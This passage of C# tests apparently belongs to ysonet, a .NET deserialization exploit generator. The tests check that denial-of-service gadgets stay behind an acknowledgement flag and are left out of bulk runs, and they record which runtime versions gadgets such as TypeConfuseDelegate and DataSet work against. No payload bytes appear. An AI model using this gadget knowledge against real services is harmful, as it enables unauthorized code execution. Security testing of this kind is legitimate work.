        {
            // The literal is asserted on purpose: renaming the flag must not quietly
            // leave users without a way forward.
            AssertEqual("--i-understand-dos", DosPolicy.AckFlagName, "the flag name is stable");
            AssertEqual("i-understand-dos", DosPolicy.AckOptionName, "the option name is stable");

            string msg = DosPolicy.RefusalMessage("SomeDosGadget");
            AssertTrue(msg.Contains("SomeDosGadget"), "the refusal names the gadget");
            AssertTrue(msg.Contains("--i-understand-dos"), "the refusal names the flag");
            AssertTrue(msg.ToLowerInvariant().Contains("denial-of-service"), "the refusal says why");

            AssertTrue(DosPolicy.RefusalIfUnacknowledged("ObjectDataProvider", false) == null,
                "an ordinary gadget is never refused");
            AssertTrue(DosPolicy.RefusalIfUnacknowledged("NoSuchGadget", false) == null,
                "an unknown gadget is left to the caller's own error");
        }

        private static void DosWarningTextIsActionable()
        {
            IGenerator dos = new ysonet.Tests.Helpers.TestingArena.DosFakeGenerator();
            string w = DosPolicy.WarningText(dos);
            AssertTrue(w.Contains("WARNING"), "the banner is marked as a warning");
            AssertTrue(w.Contains("DosFake"), "the banner names the gadget");
            AssertTrue(w.Contains("terminate the target process"), "the banner states the effect");
            AssertTrue(w.ToLowerInvariant().Contains("authorized"), "the banner states the authorization rule");
            AssertTrue(w.Contains("Test-only fake, generates nothing real."),
                "the gadget's own AdditionalInfo is kept, not generalized away");

            AssertEqual("", DosPolicy.WarningText("NoSuchGadget"), "an unknown name yields no banner");

            // The interactive preview marker, and the check the renderers use to
            // draw it in the error color.
            AssertEqual("", DosPolicy.PreviewWarning("ObjectDataProvider"),
                "an ordinary gadget gets no preview warning");
            AssertTrue(DosPolicy.IsPreviewWarning("  " + DosPolicy.PreviewMarker + " - ..."),
                "a marked line is recognised for colouring");
            AssertTrue(!DosPolicy.IsPreviewWarning("Formatters: BinaryFormatter"),
                "an ordinary preview line is not coloured");

            AssertEqual("", DosPolicy.SkipNotice(0), "nothing is said when nothing was skipped");
            AssertTrue(DosPolicy.SkipNotice(1).Contains(DosPolicy.AckFlagName),
                "the skip notice says how to run one deliberately");
            AssertTrue(DosPolicy.SkipNotice(3).Contains("3"), "the skip notice shows the count");
        }

        private static void DosAcknowledgementSurvivesInputArgsCopy()
        {
            InputArgs ia = new InputArgs();
            AssertTrue(!ia.DosAcknowledged, "nothing is acknowledged by default");

            ia.DosAcknowledged = true;
            ia.ExtraArguments = new List<string> { "--variant", "2" };
            InputArgs copy = ia.DeepCopy();
            AssertTrue(copy.DosAcknowledged, "DeepCopy preserves the acknowledgement");

            // It is global execution context, never a gadget option: a gadget's own
            // option parsing must never see it.
            foreach (string a in copy.ExtraArguments)
                AssertTrue(a.IndexOf(DosPolicy.AckOptionName, StringComparison.OrdinalIgnoreCase) < 0,
                    "the flag is not in ExtraArguments");
            foreach (string a in copy.ExtraInternalArguments)
                AssertTrue(a.IndexOf(DosPolicy.AckOptionName, StringComparison.OrdinalIgnoreCase) < 0,
                    "the flag is not in ExtraInternalArguments");
        }

        private static void GenericGeneratorRefusesDosWithoutAcknowledgement()
        {
            IGenerator dos = new ysonet.Tests.Helpers.TestingArena.DosFakeGenerator();
            InputArgs plain = new InputArgs();

            string refusal = "";
            try { dos.GenerateWithInit("BinaryFormatter", plain); }
            catch (Exception ex) { refusal = ex.Message; }
            AssertTrue(refusal.Contains(DosPolicy.AckFlagName),
                "the wrapper refuses and names the flag (got '" + refusal + "')");

            // GenerateWithNoTest and GenerateInner both flow through the wrapper, so
            // no ordinary generation path can slip past it.
            AssertThrows(delegate { dos.GenerateWithNoTest("BinaryFormatter", plain); },
                "GenerateWithNoTest is refused too");
            AssertThrows(delegate { dos.GenerateInner("BinaryFormatter", plain); },
                "GenerateInner is refused too");
            AssertThrows(delegate { dos.GenerateWithInit("BinaryFormatter", null); },
                "a missing InputArgs is not an acknowledgement");

            InputArgs acked = new InputArgs();
            acked.DosAcknowledged = true;
            AssertTrue(!RawIsEmpty(dos.GenerateWithInit("BinaryFormatter", acked)),
                "an acknowledged run proceeds");
            AssertTrue(!RawIsEmpty(dos.GenerateInner("BinaryFormatter", acked)),
                "the acknowledgement survives the inner-gadget copy");

            // An ordinary gadget is completely unaffected.
            IGenerator safe = new ysonet.Tests.Helpers.TestingArena.SafeFakeGenerator();
            AssertTrue(!RawIsEmpty(safe.GenerateWithInit("BinaryFormatter", plain)),
                "a non-DoS gadget still generates without any flag");
        }

        private static void DosBulkPartitionExcludesEveryDosGadget()
        {
            var names = new List<string>(GadgetRegistry.GetAllGadgetNames());
            AssertTrue(names.Count > 0, "found gadgets to partition");

            BulkGadgetPartition byName = DosPolicy.PartitionBulkGadgets(names);
            AssertEqual(names.Count, byName.Safe.Count + byName.Skipped.Count,
                "every gadget is classified exactly once");
            foreach (string n in byName.Safe)
            {
                AssertTrue(!byName.IsSkipped(n), "the safe and skipped sets are disjoint: " + n);
                AssertTrue(!DosPolicy.IsDosGadget(n), "no DoS gadget stays in the run set: " + n);
            }
            foreach (string n in byName.Skipped)
                AssertTrue(DosPolicy.IsDosGadget(n), "only DoS gadgets are skipped: " + n);

            // The instance overload (used by the interactive run-all) classifies the
            // same way as the name overload (used by the CLI --raf loop).
            var gadgets = new List<IGenerator>();
            foreach (string n in names)
            {
                IGenerator g = GadgetRegistry.CreateGadgetInstance(n);
                if (g != null) gadgets.Add(g);
            }
            BulkGadgetPartition byInstance = DosPolicy.PartitionBulkGadgets(gadgets);
            AssertEqual(byName.Skipped.Count, byInstance.Skipped.Count,
                "both bulk paths skip the same gadgets");
            foreach (string n in byInstance.Skipped)
                AssertTrue(byName.IsSkipped(n), "instance partition skips the same names: " + n);
        }

        private static void DosAcknowledgementCommandEcho()
        {
            var extra = new List<string> { "--variant", "2" };

            List<string> withAck = CommandEcho.GadgetTokens("SomeGadget", "BinaryFormatter",
                "calc.exe", false, false, "", "", "", false, false, false, false, true, extra);
            int count = 0;
            foreach (string t in withAck)
                if (t == DosPolicy.AckFlagName) count++;
            AssertEqual(1, count, "the acknowledgement is emitted exactly once");

            // It is a global flag, so it must never appear among the gadget's own
            // option tokens.
            foreach (string t in extra)
                AssertTrue(t != DosPolicy.AckFlagName, "the flag is never a gadget option");

            List<string> without = CommandEcho.GadgetTokens("SomeGadget", "BinaryFormatter",
                "calc.exe", false, false, "", "", "", false, false, false, false, false, extra);
            AssertTrue(!without.Contains(DosPolicy.AckFlagName),
                "nothing is emitted when the run was not acknowledged");

            List<string> legacy = CommandEcho.GadgetTokens("SomeGadget", "BinaryFormatter",
                "calc.exe", false, false, "", "", "", false, false, false, false, extra);
            AssertTrue(!legacy.Contains(DosPolicy.AckFlagName),
                "the original overload is unchanged");
        }

        private static void DosAcknowledgementFieldFollowsSelections()
        {
            // The acknowledgement is a field, not a typed confirmation: the warning
            // banner is the real signal. It is offered only when the selection would
            // actually build a DoS payload, so it never becomes a box people tick out
            // of habit. No gadget declares the facet yet, so today every gadget must
            // hide it and never emit it.
            var session = new WizardSession();
            var editor = new ModuleEditor(null, null, true, null, session);

            var fields = editor.BuildFieldsForTest("DataSet");
            EditableField ack = FindEditable(fields, DosPolicy.AckOptionName);
            AssertTrue(ack != null, "the acknowledgement field object exists");
            AssertTrue(ack.Hidden, "it is hidden for a gadget that is not a DoS gadget");

            // Even if a value were carried over in session memory, a hidden field is
            // never emitted (the same guard the bridged chain uses).
            ack.Value = "true"; ack.Touched = true;
            string cmd = editor.GadgetCommandLineForTest();
            AssertTrue(cmd.IndexOf(DosPolicy.AckOptionName, StringComparison.OrdinalIgnoreCase) < 0,
                "a hidden acknowledgement is not emitted: " + cmd);

            // The three plugins that let the user pick an inner gadget expose the
            // same flag as a plugin option, so the acknowledgement reaches them
            // through their own argv instead of an ambient static.
            foreach (string pluginName in new string[] { "ViewState", "Resx", "SharePoint" })
            {
                IPlugin p = PluginRegistry.CreatePluginInstance(pluginName);
                AssertTrue(p != null, pluginName + " loads");
                var opts = CliListing.PluginOptions(pluginName);
                AssertTrue(opts.Contains(DosPolicy.AckFlagName),
                    pluginName + " exposes " + DosPolicy.AckFlagName);
            }
        }

        private static void DosGadgetsAreContained()
        {
            // The coverage guard. It derives the DoS set from facets (never a name
            // list), so a future DoS gadget is covered the moment it declares one.
            var dosNames = new List<string>();
            foreach (string name in GadgetRegistry.GetAllGadgetNames())
                if (DosPolicy.IsDosGadget(name))
                    dosNames.Add(name);

            BulkGadgetPartition bulk = DosPolicy.PartitionBulkGadgets(GadgetRegistry.GetAllGadgetNames());
            AssertEqual(dosNames.Count, bulk.Skipped.Count,
                "every DoS gadget is left out of the shared bulk run set");

            if (dosNames.Count == 0)
            {
                // Nothing declares the facet yet. Say so rather than reporting a pass
                // that checked nothing.
                Console.Error.WriteLine("  [info] no gadget declares denial-of-service yet; "
                    + "the fakes cover the policy and this guard goes live with the first one");
                return;
            }

            // A bridge consumer for the --bgc precedence check, picked from the
            // catalogue rather than hardcoded.
            string bridgeConsumer = null;
            foreach (string name in GadgetRegistry.GetAllGadgetNames())
            {
                IGenerator cand = GadgetRegistry.CreateGadgetInstance(name);
                if (cand != null && cand.Labels().Contains(GadgetTags.Bridged)
                    && !string.IsNullOrEmpty(cand.SupportedBridgedFormatter()))
                {
                    bridgeConsumer = name;
                    break;
                }
            }

            // A DoS gadget need not take a shell command (FileLogTraceListener takes a
            // path), so the sample input follows the gadget's declared input type, the
            // same way the normal-tier sweep does.
            string csFixture = WriteTestArtifact("ysonet_dos_fixture.cs",
                "public class YsonetDosFixture { public YsonetDosFixture() { } }");
            string dllFixture = new Uri(typeof(OptionSet).Assembly.CodeBase).LocalPath;
            string contentFixture = ContentFixture();

            try
            {
            foreach (string name in dosNames)
            {
                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                AssertTrue(g != null, "DoS gadget loads: " + name);
                string formatter = g.SupportedFormatters()[0].Split(' ')[0];
                string sample = SampleInputForGadget(g.CommandInput(), csFixture, dllFixture, contentFixture);

                InputArgs plain = new InputArgs();
                plain.Cmd = sample;
                RunResult refused = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = name,
                    FormatterName = formatter,
                    OutputFormat = "",
                    InputArgs = plain,
                });
                AssertTrue(!refused.Success, name + " must be refused without the acknowledgement");
                AssertTrue((refused.ErrorMessage ?? "").Contains(DosPolicy.AckFlagName),
                    name + " refusal must name the flag (got '" + refused.ErrorMessage + "')");

                // The gadget must be out of the automatic sweeps, which is what keeps
                // the default suite from ever building it.
                AssertTrue(bulk.IsSkipped(name), name + " must be out of the shared bulk run set");

                // In a --bgc chain the missing acknowledgement is reported before the
                // bridge compatibility rules, so the reason is deterministic. This
                // refusal builds nothing, so it runs in every tier.
                if (bridgeConsumer != null)
                {
                    RunResult chained = PayloadRunner.GenerateGadget(new GenerationRequest
                    {
                        GadgetName = bridgeConsumer,
                        FormatterName = "BinaryFormatter",
                        BridgedGadgetChain = name,
                        OutputFormat = "",
                        InputArgs = new InputArgs(),
                    });
                    AssertTrue(!chained.Success, name + " in a chain must be refused too");
                    AssertTrue((chained.ErrorMessage ?? "").Contains(DosPolicy.AckFlagName),
                        name + " chain refusal must name the flag, not a bridge error (got '"
                        + chained.ErrorMessage + "')");
                }

                // Building the payload is the one part that needs a deliberate
                // decision, so it is opt-in (--dos / YSONET_DOS_TESTS). The default
                // run proves containment only and never produces a DoS payload.
                if (!_dosGenerationAllowed)
                {
                    Console.Error.WriteLine("  [skip] not building " + name
                        + " (denial-of-service; re-run with --dos to include it)");
                    continue;
                }

                foreach (string formatterEntry in g.SupportedFormatters())
                {
                    string acknowledgedFormatter = formatterEntry.Split(' ')[0];
                    foreach (bool minify in new[] { false, true })
                    {
                        InputArgs acked = new InputArgs();
                        acked.Cmd = sample;
                        acked.Minify = minify;
                        acked.DosAcknowledged = true;
                        RunResult allowed = PayloadRunner.GenerateGadget(new GenerationRequest
                        {
                            GadgetName = name,
                            FormatterName = acknowledgedFormatter,
                            OutputFormat = "",
                            InputArgs = acked,
                        });
                        string cell = name + " -f " + acknowledgedFormatter
                            + (minify ? " --minify" : "");
                        AssertTrue(allowed.Success, cell + " must generate once acknowledged: " + allowed.ErrorMessage);
                        AssertTrue(allowed.Warnings.Count > 0, cell + " must return its warning with the payload");
                        AssertTrue(allowed.Warnings[0].Contains(name), cell + " warning must name the gadget");
                    }
                }

                // After acknowledgement an unbridgeable DoS gadget may still fail on
                // the ordinary bridge rules; it just must not still report a missing
                // acknowledgement.
                if (bridgeConsumer != null)
                {
                    InputArgs chainAcked = new InputArgs();
                    chainAcked.Cmd = sample;
                    chainAcked.DosAcknowledged = true;
                    RunResult chainOk = PayloadRunner.GenerateGadget(new GenerationRequest
                    {
                        GadgetName = bridgeConsumer,
                        FormatterName = "BinaryFormatter",
                        BridgedGadgetChain = name,
                        OutputFormat = "",
                        InputArgs = chainAcked,
                    });
                    AssertTrue(chainOk.Success
                        || (chainOk.ErrorMessage ?? "").IndexOf(DosPolicy.AckFlagName, StringComparison.Ordinal) < 0,
                        name + " acknowledged chain must not still report a missing acknowledgement");
                }
            }
            }
            finally
            {
                try { File.Delete(csFixture); } catch { }
                try { File.Delete(contentFixture); } catch { }
            }
        }

        // ---- Category facet tests ---------------------------------------------

        private static void FacetVocabularyIsBroadAndValid()
        {
            foreach (var vocab in new[] { PayloadKind.All, PayloadInput.All, GadgetRequirement.All })
            {
                AssertTrue(vocab.Length >= 5, "an axis has a broad vocabulary");
                var seen = new HashSet<string>(StringComparer.Ordinal);
                foreach (string v in vocab)
                {
                    AssertTrue(!string.IsNullOrEmpty(v), "no empty vocabulary value");
                    AssertTrue(seen.Add(v), "vocabulary value '" + v + "' is unique");
                    AssertTrue(!string.IsNullOrEmpty(GadgetFacetReader.Label(v)), "value '" + v + "' has a label");
                }
                AssertTrue(seen.Contains("uncategorized"), "axis includes uncategorized");
                AssertTrue(seen.Contains("other"), "axis includes other");
            }
            // The removed, over-narrow effect/target values must not have crept back.
            foreach (string gone in new[] { "file-delete", "ntlm-smb", "dns", "working-directory-change", "target-location" })
                foreach (var vocab in new[] { PayloadKind.All, PayloadInput.All, GadgetRequirement.All })
                    AssertTrue(Array.IndexOf(vocab, gone) < 0, "removed value '" + gone + "' is absent");
        }

        // The version axis is the one axis that carries exact numbers, so it has its
        // own vocabulary rules: ordered oldest-first inside each family, unique,
        // labelled, and using "unspecified" (not "uncategorized") for no evidence.
        private static void VersionVocabularyIsOrderedAndValid()
        {
            var seen = new HashSet<string>(StringComparer.Ordinal);
            foreach (string v in RuntimeVersion.All)
            {
                AssertTrue(!string.IsNullOrEmpty(v), "no empty version value");
                AssertTrue(seen.Add(v), "version value '" + v + "' is unique");
                AssertTrue(!string.IsNullOrEmpty(GadgetFacetReader.Label(v)), "version '" + v + "' has a label");
            }
            AssertTrue(seen.Contains(RuntimeVersion.Unspecified), "the axis has an unspecified value");
            AssertTrue(seen.Contains(RuntimeVersion.Other), "the axis has an other value");
            AssertTrue(!seen.Contains("uncategorized"), "the version axis uses 'unspecified', not 'uncategorized'");
            AssertEqual(RuntimeVersion.Unspecified, GadgetFacetReader.NoEvidenceValueFor(CategoryAxis.Version),
                "the version axis reports unspecified as its no-evidence value");
            AssertEqual("uncategorized", GadgetFacetReader.NoEvidenceValueFor(CategoryAxis.Kind),
                "the broad axes still report uncategorized");

            // Each family must be contiguous and ascending, because Range() slices
            // this array and the display sorts by position in it.
            AssertTrue(RuntimeVersion.IndexOf(RuntimeVersion.NetFx20) < RuntimeVersion.IndexOf(RuntimeVersion.NetFx481),
                "framework versions ascend");
            AssertTrue(RuntimeVersion.IndexOf(RuntimeVersion.NetFx481) < RuntimeVersion.IndexOf(RuntimeVersion.Net50),
                ".NET Framework precedes modern .NET");
            AssertTrue(RuntimeVersion.IndexOf(RuntimeVersion.Net90) < RuntimeVersion.IndexOf(RuntimeVersion.Net100),
                ".NET 10.0 sorts after 9.0, not between 1.0 and 2.0");
            AssertEqual(".NET Framework 4.8.1", GadgetFacetReader.Label(RuntimeVersion.NetFx481), "framework label");
            AssertEqual(".NET 5.0", GadgetFacetReader.Label(RuntimeVersion.Net50), "modern label");
            AssertEqual("Mono", GadgetFacetReader.Label(RuntimeVersion.Mono), "mono label");
            AssertEqual("net-framework", GadgetRequirement.NetFramework,
                "the requirement value is distinct from the version tokens");
            AssertEqual(".NET Framework", GadgetFacetReader.Label(GadgetRequirement.NetFramework),
                "the net-framework requirement keeps its own label");
        }

        private static void VersionRangeExpandsAndGuards()
        {
            string[] span = RuntimeVersion.Range(RuntimeVersion.NetFx48, RuntimeVersion.NetFx481);
            AssertSetEqual(new List<string>(span), new[] { RuntimeVersion.NetFx48, RuntimeVersion.NetFx481 },
                "a two-version range expands inclusively");
            AssertSetEqual(new List<string>(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx461)),
                new[] { RuntimeVersion.NetFx45, RuntimeVersion.NetFx451, RuntimeVersion.NetFx452,
                        RuntimeVersion.NetFx46, RuntimeVersion.NetFx461 },
                "4.5 to 4.6.1 covers every servicing version in between");
            AssertEqual(1, RuntimeVersion.Range(RuntimeVersion.Net50, RuntimeVersion.Net50).Length,
                "a single-version range is allowed");

            AssertThrows(() => RuntimeVersion.Range(RuntimeVersion.NetFx481, RuntimeVersion.Net50),
                "a range cannot cross runtime families");
            AssertThrows(() => RuntimeVersion.Range(RuntimeVersion.NetFx481, RuntimeVersion.NetFx48),
                "a reversed range is rejected");
            AssertThrows(() => RuntimeVersion.Range("net-fx-4.9", RuntimeVersion.NetFx481),
                "an unknown version is rejected");
            AssertThrows(() => RuntimeVersion.Range(RuntimeVersion.Unspecified, RuntimeVersion.NetFx48),
                "unspecified is not a range endpoint");
        }

        private static void VersionResolveAcceptsUserForms()
        {
            AssertEqual(RuntimeVersion.NetFx481, RuntimeVersion.Resolve("net-fx-4.8.1"), "canonical token");
            AssertEqual(RuntimeVersion.NetFx481, RuntimeVersion.Resolve("4.8.1"), "a bare number means .NET Framework");
            AssertEqual(RuntimeVersion.NetFx48, RuntimeVersion.Resolve(".NET 4.8"), "dotted family word");
            AssertEqual(RuntimeVersion.NetFx48, RuntimeVersion.Resolve("Framework 4.8"), "the word framework");
            AssertEqual(RuntimeVersion.Net50, RuntimeVersion.Resolve("net5.0"), "modern short form");
            AssertEqual(RuntimeVersion.Net50, RuntimeVersion.Resolve("5.0"), "a bare number with no framework build");
            AssertEqual(RuntimeVersion.Mono, RuntimeVersion.Resolve("MONO"), "case-insensitive");
            AssertTrue(RuntimeVersion.Resolve("4.9") == null, "a version that never existed does not resolve");
            AssertTrue(RuntimeVersion.Resolve("") == null, "empty does not resolve");
        }

        // Evidence rule: a gadget only names runtime versions when the repo actually
        // establishes them. Everything else stays "unspecified" rather than
        // inheriting a comfortable-looking default.
        private static void VersionSupportIsEvidenced()
        {
            // ActivitySurrogateDisableTypeCheck exists to switch off the 4.8+ type
            // check, and its variant override must repeat the same support.
            foreach (int variant in new[] { 1, 2 })
                AssertSetEqual(CapVersions("ActivitySurrogateDisableTypeCheck", variant),
                    new[] { RuntimeVersion.NetFx48, RuntimeVersion.NetFx481 },
                    "ActivitySurrogateDisableTypeCheck variant " + variant + " is a 4.8+ payload");

            AssertSetEqual(CapVersions("BaseActivationFactory", null),
                new[] { RuntimeVersion.Net50, RuntimeVersion.Net60, RuntimeVersion.Net70 },
                "BaseActivationFactory is documented for .NET 5/6/7");

            AssertSetEqual(CapVersions("TypeConfuseDelegateMono", null),
                new[] { RuntimeVersion.Mono }, "the Mono variant is recorded on Mono");

            // Earned by the FULL suite: the ceiling is the build the payload fired on
            // (see RuntimeBuild), the floor is where the chain's types are documented.
            AssertSetEqual(CapVersions("TypeConfuseDelegate", 1),
                RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481),
                "TypeConfuseDelegate starts at the 4.5-era ComparisonComparer");
            AssertSetEqual(CapVersions("DataSet", null),
                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481),
                "a carrier with no 4.5-only type starts at the CLR v4 floor");
            AssertSetEqual(CapVersions("PSObject", null),
                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481),
                "PSObject fired here with its bundled assembly; the CVE-2017-8565 patch "
                + "gate is a separate fact and stays in AdditionalInfo");

            // A gadget the suite never fires, and whose documented support is only
            // partial, must still say nothing rather than borrow a range.
            AssertSetEqual(CapVersions("GetterCompilerResults", 1),
                new[] { RuntimeVersion.Unspecified },
                "no reproduction and only partial documentation stays unspecified");

            // Nothing may pair a real version with "unspecified" anywhere.
            foreach (GadgetCapability c in GadgetFacetReader.ExpandAll())
            {
                AssertTrue(c.Versions.Count > 0, c.GadgetName + " has a version value");
                if (c.Versions.Count > 1)
                    AssertTrue(!c.Versions.Contains(RuntimeVersion.Unspecified),
                        c.GadgetName + " does not mix unspecified with a real version");
            }
        }

        // A variant FacetOverride replaces the WHOLE set, so it is easy to restate the
        // requirements and silently drop the versions the gadget had declared - the
        // variant then reads as "no evidence" while its siblings claim a range. Caught
        // this on ObjectDataProvider v3 and ResourceSet v2 when the axis was first
        // filled in, so it is worth a standing check rather than a comment.
        private static void VariantOverridesKeepTheirVersions()
        {
            foreach (string name in CliListing.Gadgets())
            {
                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                if (g == null)
                    continue;

                bool anyReal = false, anyMissing = false;
                foreach (GadgetCapability c in GadgetFacetReader.Expand(g))
                {
                    if (c.Versions.Contains(RuntimeVersion.Unspecified))
                        anyMissing = true;
                    else
                        anyReal = true;
                }
                AssertTrue(!(anyReal && anyMissing), name + ": some variants declare runtime versions "
                    + "and others do not. A FacetOverride replaces the whole set, so repeat the range "
                    + "in the override (or leave the whole gadget unspecified).");
            }
        }

        private static void VersionSummaryCollapsesRanges()
        {
            AssertEqual(".NET Framework 2.0 - 4.7.2",
                GadgetFacetReader.VersionSummary(RuntimeVersion.Range(RuntimeVersion.NetFx20, RuntimeVersion.NetFx472)),
                "a contiguous framework span renders as one range");
            AssertEqual(".NET 5.0 - 7.0",
                GadgetFacetReader.VersionSummary(RuntimeVersion.Range(RuntimeVersion.Net50, RuntimeVersion.Net70)),
                "a contiguous modern span renders as one range");
            AssertEqual(".NET Framework 4.8.1",
                GadgetFacetReader.VersionSummary(new List<string> { RuntimeVersion.NetFx481 }),
                "a single version renders alone");
            AssertEqual("Unspecified",
                GadgetFacetReader.VersionSummary(new List<string> { RuntimeVersion.Unspecified }),
                "no evidence renders as Unspecified");
            AssertEqual(".NET Framework 4.5, .NET Framework 4.8 - 4.8.1",
                GadgetFacetReader.VersionSummary(new List<string>
                    { RuntimeVersion.NetFx481, RuntimeVersion.NetFx45, RuntimeVersion.NetFx48 }),
                "a gap splits the summary into separate runs");
            // A family boundary is never collapsed, even though the tokens are adjacent.
            AssertEqual(".NET Framework 4.8.1, .NET 5.0",
                GadgetFacetReader.VersionSummary(new List<string> { RuntimeVersion.NetFx481, RuntimeVersion.Net50 }),
                "adjacent tokens in different families stay separate");
        }

        private static void EveryGadgetExpandsToCapabilities()
        {
            var all = GadgetFacetReader.ExpandAll();
            AssertTrue(all.Count > 25, "gadgets expand to many capability units");
            AssertTrue(!all.Exists(c => string.Equals(c.GadgetName, "Generic", StringComparison.OrdinalIgnoreCase)),
                "the Generic placeholder is excluded");

            foreach (string name in CliListing.Gadgets())
            {
                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                int variantCount = g.Variants() == null ? 0 : g.Variants().Count;
                int expectedUnits = variantCount == 0 ? 1 : variantCount;
                var units = GadgetFacetReader.Expand(g);
                AssertEqual(expectedUnits, units.Count, name + " expands to one unit per variant");
                foreach (var c in units)
                {
                    AssertTrue(c.Kinds.Count > 0, name + " has a kind");
                    AssertTrue(c.Inputs.Count > 0, name + " has an accepted input");
                    AssertTrue(c.Requirements.Count > 0, name + " has requirements");
                    AssertTrue(c.Versions.Count > 0, name + " has a runtime version value");
                    AssertTrue(c.Formatters.Count > 0, name + " has formatter tokens");
                }
            }
        }

        private static void DefaultFacetsAreHonest()
        {
            var def = new GadgetFacetSet();
            AssertSetEqual(def.Kinds, new[] { "uncategorized" }, "default kind is uncategorized");
            AssertSetEqual(def.Requirements, new[] { "uncategorized" }, "default requirements are uncategorized");
            AssertSetEqual(def.Versions, new[] { RuntimeVersion.Unspecified }, "default versions are unspecified");
            AssertTrue(def.Inputs == null, "default inputs are null (derive from CommandInputType)");

            var cap = GadgetFacetReader.BuildCapability("X", null, null, new GadgetFacetSet(),
                CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" });
            AssertSetEqual(cap.Kinds, new[] { "uncategorized" }, "default kind normalizes to uncategorized");
            AssertSetEqual(cap.Inputs, new[] { PayloadInput.Command }, "shell command derives to command");
            AssertSetEqual(cap.Versions, new[] { RuntimeVersion.Unspecified },
                "default versions normalize to unspecified");
        }

        private static void InputDerivationCoversCommandInputTypes()
        {
            AssertEqual(PayloadInput.Command, GadgetFacetReader.DeriveInput(CommandInputType.ShellCommand), "shell->command");
            AssertEqual(PayloadInput.SourceCodeFile, GadgetFacetReader.DeriveInput(CommandInputType.CsSourceFile), "cs->source-code-file");
            AssertEqual(PayloadInput.AssemblyFile, GadgetFacetReader.DeriveInput(CommandInputType.DllPath), "dll->assembly-file");
            AssertEqual(PayloadInput.RemoteUrl, GadgetFacetReader.DeriveInput(CommandInputType.Url), "url->remote-url");
            AssertEqual(PayloadInput.LocalFile, GadgetFacetReader.DeriveInput(CommandInputType.FilePath), "file->local-file");
            AssertEqual(PayloadInput.TargetPath, GadgetFacetReader.DeriveInput(CommandInputType.TargetPath), "target path->target-path");
            AssertEqual(PayloadInput.TargetPath, GadgetFacetReader.DeriveInput(CommandInputType.TargetPathPair), "target path pair->target-path");
            // A single derived value cannot say "both", so the target path wins and the
            // write variant declares WithInputs(target-path, local-file) explicitly.
            AssertEqual(PayloadInput.TargetPath, GadgetFacetReader.DeriveInput(CommandInputType.TargetPathAndLocalFile), "target path + local file->target-path");
            AssertEqual(PayloadInput.None, GadgetFacetReader.DeriveInput(CommandInputType.Ignored), "ignored->none");

            // Every enum member must have its own derivation: a new input type that is not
            // mapped would silently fall through to "uncategorized".
            foreach (CommandInputType t in Enum.GetValues(typeof(CommandInputType)))
                AssertTrue(GadgetFacetReader.DeriveInput(t) != PayloadInput.Uncategorized,
                    "CommandInputType." + t + " derives a real accepted-input value");
        }

        private static void ExplicitInputsReplaceDerivedInput()
        {
            var set = new GadgetFacetSet().WithInputs(PayloadInput.LocalFile, PayloadInput.UncPath);
            var cap = GadgetFacetReader.BuildCapability("X", null, null, set,
                CommandInputType.FilePath, new List<string> { "Json.NET" });
            AssertSetEqual(cap.Inputs, new[] { PayloadInput.LocalFile, PayloadInput.UncPath },
                "explicit inputs win over the derived single value");
        }

        private static void UncategorizedCannotMix()
        {
            AssertThrows(() => GadgetFacetReader.BuildCapability("X", null, null,
                new GadgetFacetSet().WithKinds(PayloadKind.Uncategorized, PayloadKind.CodeExecution),
                CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" }),
                "uncategorized mixed with a real kind is rejected");

            AssertThrows(() => GadgetFacetReader.BuildCapability("X", null, null,
                new GadgetFacetSet().WithRequirements("made-up-value"),
                CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" }),
                "an unknown requirement value is rejected");

            AssertThrows(() => GadgetFacetReader.BuildCapability("X", null, null,
                new GadgetFacetSet().WithInputs(PayloadInput.Uncategorized, PayloadInput.Command),
                CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" }),
                "uncategorized mixed with a real input is rejected");

            AssertThrows(() => GadgetFacetReader.BuildCapability("X", null, null,
                new GadgetFacetSet().WithVersions(RuntimeVersion.Unspecified, RuntimeVersion.NetFx48),
                CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" }),
                "unspecified mixed with a real version is rejected");

            AssertThrows(() => GadgetFacetReader.BuildCapability("X", null, null,
                new GadgetFacetSet().WithVersions("net-fx-9.9"),
                CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" }),
                "an unknown version value is rejected");
        }

        private static void VariantFacetInheritanceAndOverride()
        {
            // Inheritance across a subclass: ActivitySurrogateSelectorFromFile inherits
            // the parent's code-execution facets and derives source-code-file input.
            var fromFile = FindCap("ActivitySurrogateSelectorFromFile", 1);
            AssertTrue(fromFile != null, "subclass gadget expands");
            AssertSetEqual(fromFile.Kinds, new[] { PayloadKind.CodeExecution }, "subclass inherits parent kind");
            AssertSetEqual(fromFile.Inputs, new[] { PayloadInput.SourceCodeFile }, "subclass derives source-code-file");

            // Within a gadget: variant 1 inherits, variant 2 overrides the requirements.
            var v1 = FindCap("ActivitySurrogateDisableTypeCheck", 1);
            var v2 = FindCap("ActivitySurrogateDisableTypeCheck", 2);
            AssertTrue(v1 != null && v2 != null, "both variants expand");
            AssertTrue(v1.Requirements.Contains(GadgetRequirement.BuiltIn), "variant 1 inherits built-in");
            AssertTrue(!v1.Requirements.Contains(GadgetRequirement.ExtraAssembly), "variant 1 is not extra-assembly");
            AssertTrue(v2.Requirements.Contains(GadgetRequirement.ExtraAssembly), "variant 2 override adds extra-assembly");
        }

        private static void VariantFormatterAndInputAreEffective()
        {
            // Variant 1 of XamlAssemblyLoadFromFile opts out of SoapFormatter; variant 2
            // keeps it. The reader must apply the per-variant formatter exclusion.
            var v1 = FindCap("XamlAssemblyLoadFromFile", 1);
            var v2 = FindCap("XamlAssemblyLoadFromFile", 2);
            AssertTrue(v1 != null && v2 != null, "both variants expand");
            AssertTrue(!v1.Formatters.Contains("SoapFormatter"), "variant 1 excludes SoapFormatter");
            AssertTrue(v2.Formatters.Contains("SoapFormatter"), "variant 2 keeps SoapFormatter");
        }

        private static void OneCapabilityMustMatchAllAxes()
        {
